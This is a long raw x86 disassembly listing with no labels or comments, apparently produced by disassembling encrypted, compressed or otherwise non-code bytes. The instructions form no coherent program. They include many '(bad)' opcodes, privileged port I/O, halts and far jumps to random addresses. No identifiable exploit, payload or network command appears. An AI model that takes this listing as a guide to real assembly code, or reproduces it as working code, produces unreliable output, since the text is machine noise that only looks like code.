  408d79:	sub    bh,dh
  408d7b:	inc    esp
  408d7c:	inc    esp
  408d7d:	stos   DWORD PTR es:[edi],eax
  408d7e:	int3   
  408d7f:	es inc ebx
  408d81:	adc    ebp,ebx
  408d83:	and    dh,BYTE PTR [eax]
  408d85:	push   ecx
  408d86:	fdivr  DWORD PTR [ecx]
  408d88:	imul   ebx,DWORD PTR [eax],0xdb920b72
  408d8e:	adc    eax,DWORD PTR [eax-0x50]
  408d91:	call   0x3e7e5904
  408d96:	push   edx
  408d97:	fbstp  TBYTE PTR ds:0x31dce241
  408d9d:	mov    edx,0xa0dd7aee
  408da2:	ja     0x408d42
  408da4:	and    ecx,ecx
  408da6:	inc    edx
  408da7:	add    BYTE PTR [edi-0x7c],0xc6
  408dab:	mov    ebp,0xa58e1861
  408db0:	jmp    0x8981f942
  408db5:	pop    edx
  408db6:	xor    dh,BYTE PTR [ebp+0x44812a4d]
  408dbc:	sbb    eax,0x497a441b
  408dc1:	jecxz  0x408e40
  408dc3:	rcr    DWORD PTR [ebx-0x3088483b],1
  408dc9:	fstp   TBYTE PTR [ecx-0xc]
  408dcc:	mov    ebp,0x9f0786e6
  408dd1:	or     dh,ch
  408dd3:	add    BYTE PTR [eax+0x6c95261c],dh
  408dd9:	sub    DWORD PTR [esi-0x67],esi
  408ddc:	ins    DWORD PTR es:[edi],dx
  408ddd:	iret   
  408dde:	push   ebp
  408ddf:	cmc    
  408de0:	lahf   
  408de1:	std    
  408de2:	pop    ecx
  408de3:	or     ch,BYTE PTR [ebp-0x6d]
  408de6:	push   ebp
  408de7:	inc    edi
  408de8:	or     eax,0x2606fb42
  408ded:	sti    
  408dee:	xchg   BYTE PTR [edx-0x609b82f9],dl
  408df4:	xchg   DWORD PTR [esi-0x66cdb9ed],esi
  408dfa:	das    
  408dfb:	mov    esi,0x7e94a799
  408e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e01:	sub    eax,0xdadbf790
  408e06:	sbb    al,0xaf
  408e08:	mov    edx,0x22daa672
  408e0d:	hlt    
  408e0e:	lock jg 0x408e2f
  408e11:	outs   dx,BYTE PTR ds:[esi]
  408e12:	mov    esi,0xf641d4bf
  408e17:	mov    bl,0xec
  408e19:	push   ecx
  408e1a:	push   0x4db77fc4
  408e1f:	pushf  
  408e20:	imul   ebp,edx,0x6c5934a3
  408e26:	cmp    al,0x80
  408e28:	push   eax
  408e29:	call   0xa611ed1c
  408e2e:	or     ebx,DWORD PTR [edi-0x74ef5f78]
  408e34:	and    ebp,ecx
  408e36:	push   ecx
  408e37:	(bad)  
  408e38:	mov    cl,0x6e
  408e3a:	clc    
  408e3b:	(bad)  
  408e3c:	popf   
  408e3d:	pop    ebp
  408e3e:	out    0xc7,al
  408e40:	pop    edx
  408e41:	xchg   ecx,eax
  408e42:	mov    bl,0x62
  408e44:	iret   
  408e45:	div    DWORD PTR [ecx+0x7d]
  408e48:	aas    
  408e49:	or     BYTE PTR [eax+0x7afb872],bh
  408e4f:	push   es
  408e50:	repz mov ah,0xa8
  408e53:	ins    BYTE PTR es:[edi],dx
  408e54:	push   ecx
  408e55:	push   0x980dc9de
  408e5a:	fstp   st(6)
  408e5c:	xor    DWORD PTR [ebx],esi
  408e5e:	sbb    al,0x52
  408e60:	cdq    
  408e61:	cmp    cl,BYTE PTR [esi]
  408e63:	icebp  
  408e64:	fbld   TBYTE PTR ds:0xe9ab9726
  408e6a:	test   eax,0xadad310c
  408e6f:	push   ss
  408e70:	shl    BYTE PTR [edx+0x3f642f2c],cl
  408e76:	in     al,dx
  408e77:	adc    dl,0x42
  408e7a:	and    ebx,DWORD PTR [eax]
  408e7c:	mov    cl,0x7f
  408e7e:	test   DWORD PTR [edx+0x1e],eax
  408e81:	call   FWORD PTR [edx-0x48635975]
  408e87:	add    edi,DWORD PTR [esi]
  408e89:	sub    DWORD PTR [ebx-0x3b],edi
  408e8c:	pusha  
  408e8d:	loop   0x408e25
  408e8f:	out    dx,eax
  408e90:	xchg   ebp,eax
  408e91:	(bad)  
  408e92:	js     0x408e97
  408e94:	inc    eax
  408e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e96:	mov    esp,0xd1dc4f61
  408e9b:	lods   eax,DWORD PTR ds:[esi]
  408e9c:	pusha  
  408e9d:	js     0x408e41
  408e9f:	into   
  408ea0:	and    DWORD PTR [eax-0xd],eax
  408ea3:	pop    es
  408ea4:	and    eax,eax
  408ea6:	je     0x408ecb
  408ea8:	mov    ah,0x9b
  408eaa:	ins    DWORD PTR es:[edi],dx
  408eab:	jmp    DWORD PTR [eax-0x7996728e]
  408eb1:	xlat   BYTE PTR ds:[ebx]
  408eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eb3:	repnz fst st(4)
  408eb6:	hlt    
  408eb7:	pop    eax
  408eb8:	stos   DWORD PTR es:[edi],eax
  408eb9:	ds adc cl,ah
  408ebc:	adc    BYTE PTR [ebp-0x6d],bl
  408ebf:	dec    ecx
  408ec0:	(bad)  
  408ec1:	mov    ds:0x2a4cef6d,al
  408ec6:	sti    
  408ec7:	mov    ebp,0xb523afa8
  408ecc:	out    0xba,al
  408ece:	scas   al,BYTE PTR es:[edi]
  408ecf:	xor    al,0x90
  408ed1:	fsubr  QWORD PTR [edx-0x7ea2a381]
  408ed7:	les    edx,FWORD PTR [edx-0x73]
  408eda:	or     al,0x20
  408edc:	sbb    eax,edx
  408ede:	push   0x36
  408ee0:	(bad)  
  408ee1:	push   ebp
  408ee2:	fild   DWORD PTR [esi]
  408ee4:	test   BYTE PTR [ebx+0x7ef06968],0x8b
  408eeb:	push   ebp
  408eec:	jns    0x408f41
  408eee:	adc    DWORD PTR [ecx-0x69c7e3a0],0xffffff82
  408ef5:	mov    ebp,0x68f5c36b
  408efa:	pop    edx
  408efb:	push   ecx
  408efc:	ins    DWORD PTR es:[edi],dx
  408efd:	jl     0x408f4c
  408eff:	sahf   
  408f00:	dec    ebp
  408f01:	icebp  
  408f02:	fwait
  408f03:	adc    eax,0xd328c2f4
  408f08:	sbb    BYTE PTR [edi+edx*4],dh
  408f0b:	xchg   esp,eax
  408f0c:	push   ss
  408f0d:	call   0x596df740
  408f12:	loope  0x408eec
  408f14:	mov    ebx,0x9ca72bc4
  408f19:	retf   0x44b3
  408f1c:	mov    dh,0x5f
  408f1e:	shr    edx,1
  408f20:	pop    ss
  408f21:	aad    0x2f
  408f23:	and    eax,0x1d0f383c
  408f28:	int3   
  408f29:	fist   WORD PTR [ebx+ebp*8+0x340abff]
  408f30:	cmp    al,0x1a
  408f32:	push   edx
  408f33:	adc    esp,DWORD PTR [ecx-0xc]
  408f36:	out    dx,al
  408f37:	sbb    al,0xc6
  408f39:	xchg   DWORD PTR [edi+esi*2-0x4a],esp
  408f3d:	mov    ecx,0x96b49c25
  408f42:	(bad)  
  408f43:	retf   
  408f44:	xor    ah,BYTE PTR cs:[ebp+0x4569c77a]
  408f4b:	mov    WORD PTR [eax+edx*8],?
  408f4e:	mov    ss,ebx
  408f50:	cmp    esi,DWORD PTR [ebx]
  408f52:	es xchg esp,eax
  408f54:	mov    eax,0x19f01e55
  408f59:	in     al,dx
  408f5a:	mov    dh,BYTE PTR [ecx+0x59]
  408f5d:	sub    cl,dh
  408f5f:	xor    eax,0xd3c6c8fa
  408f64:	adc    cl,dl
  408f66:	enter  0x17c5,0xcd
  408f6a:	sub    edi,ebx
  408f6c:	aas    
  408f6d:	retf   
  408f6e:	or     DWORD PTR [eax+0x77],0x64
  408f72:	popa   
  408f73:	mov    fs,WORD PTR [esi-0x238c9da1]
  408f79:	inc    esi
  408f7a:	retf   0x7ccc
  408f7d:	dec    ecx
  408f7e:	icebp  
  408f7f:	jae    0x408fa0
  408f81:	mov    ecx,0x4d1b2627
  408f86:	or     al,0xd5
  408f88:	loope  0x408fcd
  408f8a:	in     al,dx
  408f8b:	jns    0x408fc4
  408f8d:	inc    edi
  408f8e:	dec    esp
  408f8f:	and    BYTE PTR [edi],ah
  408f91:	sub    BYTE PTR [ebx+ecx*2-0x8],ah
  408f95:	pop    eax
  408f96:	pop    esp
  408f97:	call   DWORD PTR [ebp+0x2a]
  408f9a:	sbb    ecx,ebx
  408f9c:	bound  ebp,QWORD PTR [edx-0x6a]
  408f9f:	jmp    0xf54e:0x5903631b
  408fa6:	add    al,BYTE PTR [esi+0x1d]
  408fa9:	test   ebp,edi
  408fab:	xor    ebp,DWORD PTR [edx]
  408fad:	les    esi,FWORD PTR [edx+0x74]
  408fb0:	hlt    
  408fb1:	jae    0x408f99
  408fb3:	push   0x23
  408fb5:	imul   esi,DWORD PTR [ebp-0x57],0xed51db83
  408fbc:	clc    
  408fbd:	in     al,dx
  408fbe:	mov    ebx,0xf9f4442c
  408fc3:	pop    ecx
  408fc4:	dec    edx
  408fc5:	pop    ds
  408fc6:	ins    DWORD PTR es:[edi],dx
  408fc7:	outs   dx,BYTE PTR ds:[esi]
  408fc8:	std    
  408fc9:	add    esp,edx
  408fcb:	lods   eax,DWORD PTR ds:[esi]
  408fcc:	outs   dx,BYTE PTR ds:[esi]
  408fcd:	fldcw  WORD PTR [edi+edx*8-0x78]
  408fd1:	inc    edi
  408fd2:	inc    edi
  408fd3:	cdq    
  408fd4:	ss mov ecx,0x6259c121
  408fda:	lea    eax,[esp+eiz*2-0x46]
  408fde:	iret   
  408fdf:	jge    0x409028
  408fe1:	sub    esp,DWORD PTR [ebx+eax*1]
  408fe4:	pop    ebx
  408fe5:	sub    esp,edx
  408fe7:	aas    
  408fe8:	or     al,0x2e
  408fea:	push   ds
  408feb:	lahf   
  408fec:	inc    ecx
  408fed:	jno    0x408fcc
  408fef:	stos   BYTE PTR es:[edi],al
  408ff0:	(bad)  
  408ff1:	bound  edi,QWORD PTR [esi]
  408ff3:	dec    edi
  408ff4:	jecxz  0x408fc9
  408ff6:	dec    esi
  408ff7:	pop    esi
  408ff8:	pop    ebx
  408ff9:	outs   dx,BYTE PTR ds:[esi]
  408ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ffb:	inc    eax
  408ffc:	and    edx,DWORD PTR [edx-0xd]
  408fff:	dec    edx
  409000:	nop
  409001:	sbb    eax,0x8688cb7b
  409006:	adc    edx,ebp
  409008:	push   edi
  409009:	add    eax,0x15eef162
  40900e:	icebp  
  40900f:	addr16 out 0x37,al
  409012:	fincstp 
  409014:	cmc    
  409015:	adc    ah,dh
  409017:	je     0x408faa
  409019:	push   edx
  40901a:	mov    ds:0xaa56a979,al
  40901f:	jmp    0x409036
  409021:	loope  0x40905c
  409023:	neg    BYTE PTR [edi-0x30]
  409026:	cmp    BYTE PTR [esi-0x14a64670],ch
  40902c:	mov    BYTE PTR [ebp+0x7d],ch
  40902f:	cmc    
  409030:	inc    esi
  409031:	repnz dec eax
  409033:	xor    DWORD PTR [edx+0x4e6bcc5],edi
  409039:	call   0x45f2dd1a
  40903e:	ret    0x9689
  409041:	out    dx,al
  409042:	iret   
  409043:	jmp    0x7c0f:0xc396fd5a
  40904a:	or     ch,ah
  40904c:	or     eax,0x93bf2af9
  409051:	xor    DWORD PTR [edi-0x6f],ebp
  409054:	and    DWORD PTR [ebx],ebp
  409056:	pop    ebx
  409057:	xchg   esi,eax
  409058:	scas   al,BYTE PTR es:[edi]
  409059:	out    dx,al
  40905a:	inc    edi
  40905b:	or     ebx,DWORD PTR [edx]
  40905d:	aam    0xe5
  40905f:	stos   BYTE PTR es:[edi],al
  409060:	push   edx
  409061:	mov    bh,0x2b
  409063:	cmp    eax,DWORD PTR [edi]
  409065:	push   0xffffffdd
  409067:	dec    ebp
  409068:	std    
  409069:	adc    al,0x1e
  40906b:	mov    cl,0x86
  40906d:	jae    0x40905f
  40906f:	xchg   edx,eax
  409070:	xchg   ecx,eax
  409071:	out    0xf1,eax
  409073:	jae    0x40908c
  409075:	or     DWORD PTR [esi-0x13],eax
  409078:	cmp    ch,BYTE PTR [ecx+edx*2+0x32]
  40907c:	add    eax,0xce4fea08
  409081:	xchg   BYTE PTR [edx-0x1e],ch
  409084:	add    ebx,esi
  409086:	jle    0x4090f2
  409088:	jge    0x409030
  40908a:	fwait
  40908b:	cli    
  40908c:	adc    esp,DWORD PTR [esi+0x5c56ef3]
  409092:	cdq    
  409093:	mov    ?,eax
  409095:	outs   dx,DWORD PTR ds:[esi]
  409096:	inc    edi
  409097:	jmp    0x122b6fa8
  40909c:	push   edi
  40909d:	pop    edi
  40909e:	lds    ecx,FWORD PTR [edx]
  4090a0:	sub    DWORD PTR [esi-0x28],ebp
  4090a3:	int3   
  4090a4:	mov    ch,BYTE PTR [eax]
  4090a6:	rcl    bh,cl
  4090a8:	adc    DWORD PTR [eax+ecx*1],ebp
  4090ab:	xor    BYTE PTR [ecx-0x3f],bl
  4090ae:	jno    0x40903b
  4090b0:	leave  
  4090b1:	push   ebx
  4090b2:	out    dx,al
  4090b3:	sahf   
  4090b4:	mov    es,ebx
  4090b6:	add    dl,al
  4090b8:	dec    esp
  4090b9:	xchg   esp,eax
  4090ba:	cmc    
  4090bb:	or     BYTE PTR [eax+0x4f],ah
  4090be:	or     BYTE PTR [edx+0x6a],al
  4090c1:	sbb    al,0x22
  4090c3:	out    dx,eax
  4090c4:	jae    0x4090d5
  4090c6:	test   DWORD PTR [ecx+edx*2+0x22],0x10a11806
  4090ce:	push   0xffffff89
  4090d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d1:	(bad)  
  4090d2:	out    0x5,al
  4090d4:	or     eax,0x39699b9d
  4090d9:	and    bh,BYTE PTR [ecx+0xd]
  4090dc:	jmp    0x409104
  4090de:	scas   eax,DWORD PTR es:[edi]
  4090df:	xor    DWORD PTR [ecx+ecx*8+0x2a300dac],edi
  4090e6:	xchg   ecx,eax
  4090e7:	out    dx,eax
  4090e8:	pop    ebp
  4090e9:	enter  0xb94b,0xa5
  4090ed:	in     al,dx
  4090ee:	dec    ebp
  4090ef:	daa    
  4090f0:	push   ebx
  4090f1:	sti    
  4090f2:	lds    ebx,FWORD PTR [ecx+0x37048e55]
  4090f8:	mov    cl,0x2f
  4090fa:	call   0x919bc29b
  4090ff:	mov    esp,0x6e7c846c
  409104:	out    0x7e,eax
  409106:	sbb    BYTE PTR [ebx+ebx*4-0x12],0x47
  40910b:	or     ch,BYTE PTR [ecx+0x17f2edd1]
  409111:	pop    edx
  409112:	inc    edx
  409113:	lahf   
  409114:	pusha  
  409115:	in     al,0xfa
  409117:	sub    esp,eax
  409119:	pop    edx
  40911a:	or     eax,0xf2638535
  40911f:	push   esi
  409120:	(bad)  
  409122:	dec    ebp
  409123:	outs   dx,DWORD PTR ds:[esi]
  409124:	sub    bl,bh
  409126:	popf   
  409127:	mov    esi,0x8d78fd43
  40912c:	jle    0x4090d9
  40912e:	ins    BYTE PTR es:[edi],dx
  40912f:	cmc    
  409130:	or     eax,DWORD PTR [ebp-0x38bbde95]
  409136:	rcr    edx,1
  409138:	sub    al,0x33
  40913a:	mov    ds:0xe037b743,al
  40913f:	push   0x9b614f4e
  409144:	outs   dx,DWORD PTR ds:[esi]
  409145:	adc    DWORD PTR [edx+0x6bfadc22],edx
  40914b:	mov    BYTE PTR [ecx],bl
  40914d:	adc    WORD PTR [ebx-0x3a],dx
  409151:	pop    edi
  409152:	jg     0x409180
  409154:	addr16 mov eax,es:0x2e0b
  409159:	mov    eax,ds:0x33deea08
  40915e:	repz in al,dx
  409160:	mov    BYTE PTR [edx+eiz*1-0x23],dh
  409164:	es cdq 
  409166:	add    eax,0x9943fc7
  40916b:	inc    esp
  40916c:	(bad)  
  40916d:	mov    al,ds:0x3a36c388
  409172:	lock enter 0x7404,0xed
  409177:	iret   
  409178:	jno    0x4091ef
  40917a:	xor    al,0xd6
  40917c:	jmp    0x40914a
  40917e:	ret    0x5b16
  409181:	call   0x56c3f3b7
  409186:	ins    BYTE PTR es:[edi],dx
  409187:	(bad)  
  409188:	je     0x40910e
  40918a:	out    dx,eax
  40918b:	arpl   WORD PTR gs:[edi+0x1f73bb5c],sp
  409192:	outs   dx,DWORD PTR ds:[esi]
  409193:	test   al,0x5e
  409195:	inc    esi
  409196:	mov    ?,WORD PTR [ebp+edi*1-0x780cc6bb]
  40919d:	sbb    edx,edi
  40919f:	or     DWORD PTR fs:[ecx-0x5a25726b],0xf
  4091a7:	mov    ch,0x6b
  4091a9:	inc    ebp
  4091aa:	jmp    0xa982:0x4d8b3031
  4091b1:	xchg   di,ax
  4091b3:	shl    DWORD PTR [esi+0x31],1
  4091b6:	icebp  
  4091b7:	jle    0x409190
  4091b9:	ins    BYTE PTR es:[edi],dx
  4091ba:	fisub  WORD PTR [ebx+0x20]
  4091bd:	(bad)  
  4091c0:	pop    edi
  4091c1:	daa    
  4091c2:	aas    
  4091c3:	in     eax,0xbf
  4091c5:	jns    0x4091c2
  4091c7:	push   0x11b6ab09
  4091cc:	push   eax
  4091cd:	mov    esi,0xeb9d404d
  4091d2:	inc    esi
  4091d3:	ret    0xf638
  4091d6:	lods   al,BYTE PTR ds:[esi]
  4091d7:	stos   BYTE PTR es:[edi],al
  4091d8:	aam    0xba
  4091da:	push   ebp
  4091db:	mov    ebx,0x1a2f38df
  4091e0:	xchg   DWORD PTR [edi-0x21],ebp
  4091e3:	sbb    BYTE PTR [eax+0x28],bl
  4091e6:	ins    BYTE PTR es:[edi],dx
  4091e7:	jecxz  0x409212
  4091e9:	into   
  4091ea:	scas   al,BYTE PTR es:[edi]
  4091eb:	mov    ah,0x48
  4091ed:	push   ds
  4091ee:	pop    ecx
  4091ef:	inc    eax
  4091f0:	or     cl,bl
  4091f2:	pop    ecx
  4091f3:	sar    BYTE PTR [ebp+0x33],cl
  4091f6:	mov    al,ds:0x749daa1b
  4091fb:	daa    
  4091fc:	xchg   esp,eax
  4091fd:	xchg   edx,eax
  4091fe:	aam    0xb9
  409200:	pushf  
  409201:	ror    ch,0x78
  409204:	sbb    DWORD PTR [esp+ebx*8+0x19f290f7],edi
  40920b:	sub    al,0xfa
  40920d:	mov    edx,0x286009a6
  409212:	stos   BYTE PTR es:[edi],al
  409213:	fld    QWORD PTR [edx+0x44f7c24a]
  409219:	iret   
  40921a:	mov    cs,WORD PTR [ecx+0x59721897]
  409220:	rcl    DWORD PTR [edx+eax*2+0x5e29e826],cl
  409227:	data16 cli 
  409229:	pop    ss
  40922a:	out    dx,eax
  40922b:	push   edx
  40922c:	jge    0x4091f1
  40922e:	pop    es
  40922f:	rol    ebp,cl
  409231:	and    BYTE PTR [ebx],dl
  409233:	out    0xfd,eax
  409235:	imul   BYTE PTR [ebx+eax*2-0x4f]
  409239:	fcomp  DWORD PTR [ecx]
  40923b:	aad    0x44
  40923d:	repnz xchg ecx,eax
  40923f:	pop    ecx
  409240:	adc    BYTE PTR [esi+esi*8+0x232b411e],bh
  409247:	pop    edx
  409248:	or     ecx,DWORD PTR [edi]
  40924a:	mov    bh,0x30
  40924c:	or     BYTE PTR [edx+0x3544638f],dh
  409252:	hlt    
  409253:	pop    esp
  409254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409255:	cmp    bl,BYTE PTR [ebx-0x73a2db3c]
  40925b:	lock inc eax
  40925d:	and    al,0xd
  40925f:	sbb    DWORD PTR [ebp+edi*8+0x3b101c9f],esi
  409266:	pop    eax
  409267:	inc    edi
  409268:	repz int3 
  40926a:	xchg   esp,eax
  40926b:	xlat   BYTE PTR ds:[ebx]
  40926c:	sub    al,0x60
  40926e:	push   ss
  40926f:	sbb    esi,DWORD PTR [edi]
  409271:	hlt    
  409272:	outs   dx,BYTE PTR ds:[esi]
  409273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409274:	xchg   esp,eax
  409275:	cmc    
  409276:	mov    ds:0xa11ea7c,eax
  40927b:	out    0xa3,eax
  40927d:	jmp    0x6ca9:0x24a80f87
  409284:	mov    cs,ebx
  409286:	mov    ebx,0xcd75729a
  40928b:	pop    ebx
  40928c:	push   ebp
  40928d:	mov    bl,bl
  40928f:	xlat   BYTE PTR ds:[ebx]
  409290:	xor    esi,0xffffffa3
  409293:	mov    ds:0x37f646ee,eax
  409298:	add    ch,BYTE PTR [eax-0x20]
  40929b:	sbb    bh,BYTE PTR [ebx+0x30]
  40929e:	stos   BYTE PTR es:[edi],al
  40929f:	push   eax
  4092a0:	sub    DWORD PTR [edi],eax
  4092a2:	pusha  
  4092a3:	add    al,0x28
  4092a5:	fnstsw WORD PTR [esi+0x6e]
  4092a8:	mov    esp,0x9dfadc62
  4092ad:	mov    ecx,0xb4716e76
  4092b2:	outs   dx,BYTE PTR ds:[esi]
  4092b3:	popf   
  4092b4:	xchg   esi,eax
  4092b5:	cli    
  4092b6:	test   DWORD PTR [edi],esp
  4092b8:	mov    cs,WORD PTR [eax-0x5e]
  4092bb:	lock xor al,0x90
  4092be:	adc    BYTE PTR [ebx],ah
  4092c0:	sub    dl,BYTE PTR [esi]
  4092c2:	dec    ecx
  4092c3:	inc    ebp
  4092c4:	mov    al,ds:0x9ed3c99
  4092c9:	inc    edi
  4092ca:	cld    
  4092cb:	pop    ebp
  4092cc:	sub    dl,0x2d
  4092cf:	pop    esi
  4092d0:	mov    BYTE PTR [edi-0x671246a4],cl
  4092d6:	data16 shl BYTE PTR [ecx],1
  4092d9:	js     0x409330
  4092db:	daa    
  4092dc:	test   al,0x9d
  4092de:	ins    BYTE PTR es:[edi],dx
  4092df:	rcl    BYTE PTR [esi],cl
  4092e1:	in     al,0x50
  4092e3:	xchg   ecx,eax
  4092e4:	test   DWORD PTR [esi],esi
  4092e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092e7:	pop    ecx
  4092e8:	jg     0x409270
  4092ea:	test   BYTE PTR ds:0xf620e4e7,0x83
  4092f1:	fdivr  st,st(3)
  4092f3:	sub    DWORD PTR [edx],ebx
  4092f5:	push   0xfeac119b
  4092fa:	sbb    DWORD PTR [edx+0x118d5280],ebx
  409300:	mov    dh,0x45
  409302:	shl    dl,0x61
  409305:	cmp    BYTE PTR [esi+0xe],0x34
  409309:	repz adc ch,BYTE PTR [ecx-0x1]
  40930d:	xlat   BYTE PTR ds:[ebx]
  40930e:	add    eax,0x886f1531
  409313:	mov    al,ds:0x817966ab
  409318:	retf   0x335f
  40931b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931c:	icebp  
  40931d:	fistp  WORD PTR [esi+0x348996cf]
  409323:	retw   0xf55
  409327:	push   edx
  409328:	add    esp,DWORD PTR [esi]
  40932a:	shr    BYTE PTR [esi],cl
  40932c:	pop    edi
  40932d:	mov    al,ds:0xdc1978f1
  409332:	pop    esi
  409333:	xchg   ebp,eax
  409334:	dec    esi
  409335:	into   
  409336:	sub    dh,BYTE PTR ds:0xae057aad
  40933c:	or     BYTE PTR [ecx+ebp*4],dh
  40933f:	adc    eax,0xd9654cf0
  409344:	inc    eax
  409345:	nop
  409346:	sub    eax,0x2598982c
  40934b:	jmp    0xff22355a
  409350:	aad    0xd6
  409352:	ret    
  409353:	in     eax,0x5d
  409355:	xchg   eax,esi
  409357:	jg     0x409369
  409359:	cmc    
  40935a:	(bad)
  40935e:	out    0xc0,eax
  409360:	mov    eax,DWORD PTR [eax]
  409362:	push   0x4a
  409364:	add    BYTE PTR [edx+0x6a],bl
  409367:	test   ah,0x29
  40936a:	mov    esi,0xcde3625f
  40936f:	std    
  409370:	cli    
  409371:	jge    0x40936e
  409373:	bound  ecx,QWORD PTR [esi-0x2b]
  409376:	or     esp,DWORD PTR [edi-0x19ffa773]
  40937c:	psrld  mm5,QWORD PTR [esp+edx*2+0x4e]
  409381:	and    eax,0xf2ccdf5e
  409386:	xor    eax,0x528be78c
  40938b:	and    eax,0xca63a364
  409390:	ds xchg ebx,eax
  409392:	cmp    BYTE PTR [edx+eiz*8+0x71],dl
  409396:	(bad)  
  409397:	fisttp WORD PTR [eax]
  409399:	ins    BYTE PTR es:[edi],dx
  40939a:	mov    al,ds:0x676be437
  40939f:	dec    eax
  4093a0:	mov    edx,0x4e5c15
  4093a5:	test   al,0xf6
  4093a7:	jg     0x4093f0
  4093a9:	call   0xb82d:0xa9fcf557
  4093b0:	mov    bl,0x1f
  4093b2:	push   ebx
  4093b3:	jb     0x40934e
  4093b5:	mov    cl,0xdd
  4093b7:	add    ch,0x16
  4093ba:	adc    BYTE PTR es:[esi+0x2],ch
  4093be:	xchg   esp,eax
  4093bf:	scas   eax,DWORD PTR es:[edi]
  4093c0:	or     dh,bl
  4093c2:	and    edx,ebp
  4093c4:	fdivr  st,st(4)
  4093c6:	js     0x409419
  4093c8:	aas    
  4093c9:	ss (bad) 
  4093cb:	into   
  4093cc:	and    edi,ebp
  4093ce:	cmp    eax,0xe61d3ec4
  4093d3:	jmp    0x409445
  4093d5:	dec    edx
  4093d6:	lock dec esp
  4093d8:	adc    DWORD PTR [ecx-0x2898fd46],eax
  4093de:	mov    ah,0x56
  4093e0:	aam    0x57
  4093e2:	sub    DWORD PTR [eax-0x68],edx
  4093e5:	push   ecx
  4093e6:	adc    ah,BYTE PTR [edx+ebx*4]
  4093e9:	adc    BYTE PTR [esi+0x3a],ch
  4093ec:	out    0x3c,al
  4093ee:	dec    eax
  4093ef:	and    ebp,DWORD PTR [ebp+0x6a]
  4093f2:	cwde   
  4093f3:	xchg   edi,eax
  4093f4:	stos   DWORD PTR es:[edi],eax
  4093f5:	jg     0x40939c
  4093f7:	lods   eax,DWORD PTR ds:[esi]
  4093f8:	pop    ss
  4093f9:	scas   eax,DWORD PTR es:[edi]
  4093fa:	mov    al,ds:0xa6a5800a
  4093ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409400:	add    BYTE PTR [ebx],cl
  409402:	xchg   edx,eax
  409403:	repnz daa 
  409405:	outs   dx,DWORD PTR ds:[esi]
  409406:	sub    esi,DWORD PTR [eax]
  409408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409409:	push   cs
  40940a:	or     bh,dl
  40940c:	sahf   
  40940d:	add    DWORD PTR [ebp+0xc],esp
  409410:	test   cl,0xaa
  409413:	xor    BYTE PTR [eax-0x3e],ah
  409416:	cdq    
  409417:	test   al,0xff
  409419:	inc    ecx
  40941a:	out    dx,eax
  40941b:	sar    BYTE PTR cs:[edi],0xce
  40941f:	adc    esi,DWORD PTR [edi+0x38]
  409422:	mov    eax,ds:0x7d5dcae2
  409427:	push   es
  409428:	cmc    
  409429:	ins    BYTE PTR es:[edi],dx
  40942a:	popa   
  40942b:	mov    bl,0x8a
  40942d:	xchg   esp,eax
  40942e:	sbb    al,0x1
  409431:	stos   DWORD PTR es:[edi],eax
  409432:	mov    ds:0x607af1ef,eax
  409437:	in     al,0x82
  409439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40943a:	popf   
  40943b:	test   DWORD PTR [ecx-0x23cb25a],esi
  409441:	iret   
  409442:	fs call 0x3c20:0xecf70b98
  40944a:	dec    ecx
  40944b:	sbb    ebp,DWORD PTR [ecx+0x740ce031]
  409451:	adc    eax,0xbc5367f8
  409456:	enter  0x8832,0x41
  40945a:	outs   dx,DWORD PTR ds:[esi]
  40945b:	jle    0x4094cb
  40945d:	xor    ax,dx
  409460:	and    cl,BYTE PTR [edx+0x47]
  409463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409464:	and    bl,BYTE PTR [edi-0x6f]
  409467:	(bad)  
  409468:	fnsave [ecx-0x28fda126]
  40946e:	mov    ebp,0x72808439
  409473:	mov    esi,0x4d62c633
  409478:	sar    DWORD PTR [edi+0x60],1
  40947b:	adc    al,0xff
  40947d:	push   DWORD PTR [edi+0x165b07d8]
  409483:	adc    DWORD PTR [ecx+0x18],ecx
  409486:	mov    edi,0x9b91d706
  40948b:	xchg   edi,eax
  40948c:	xor    BYTE PTR [eax],al
  40948e:	and    eax,0xee3a12bf
  409493:	push   eax
  409494:	sub    al,0xc6
  409496:	sub    dl,cl
  409498:	or     al,0x53
  40949a:	inc    ebp
  40949b:	pop    es
  40949c:	call   FWORD PTR [ebx+0x1a978f8c]
  4094a2:	mov    ah,0xc
  4094a4:	inc    esi
  4094a5:	in     al,0x3d
  4094a7:	bound  edx,QWORD PTR [eax]
  4094a9:	fist   WORD PTR [esi-0x2d]
  4094ac:	shl    BYTE PTR [ebx-0x2f],cl
  4094af:	push   ebp
  4094b0:	jg     0x409488
  4094b2:	xor    eax,0xc53d9e2b
  4094b7:	cdq    
  4094b8:	mov    esi,DWORD PTR [ebx]
  4094ba:	xor    eax,0x1075ac7e
  4094bf:	pusha  
  4094c0:	fild   WORD PTR [edx-0x30]
  4094c3:	js     0x409492
  4094c5:	stc    
  4094c6:	push   0xffffff8b
  4094c8:	pop    es
  4094c9:	mov    ds:0x36bccec6,eax
  4094ce:	mov    al,ds:0xcf485579
  4094d3:	cmp    bl,BYTE PTR [edi]
  4094d5:	push   esi
  4094d6:	ds ret 
  4094d8:	daa    
  4094d9:	mov    esi,0x2a4bfc7
  4094de:	sub    eax,0x6ec58c3b
  4094e3:	in     al,dx
  4094e4:	sar    BYTE PTR [esi+0x3],1
  4094e7:	adc    al,0xeb
  4094e9:	sar    BYTE PTR [esi+0x1d],0x51
  4094ed:	jbe    0x409528
  4094ef:	pop    ecx
  4094f0:	sbb    al,BYTE PTR ds:0x9c5de817
  4094f6:	inc    esp
  4094f7:	daa    
  4094f8:	fldcw  WORD PTR [eax-0x66]
  4094fb:	fistp  WORD PTR [esi+0x17]
  4094fe:	cmp    DWORD PTR [edi-0x6d19e79a],edx
  409504:	hlt    
  409505:	out    dx,eax
  409506:	ret    0xb488
  409509:	sbb    eax,0x79fddd07
  40950e:	inc    esp
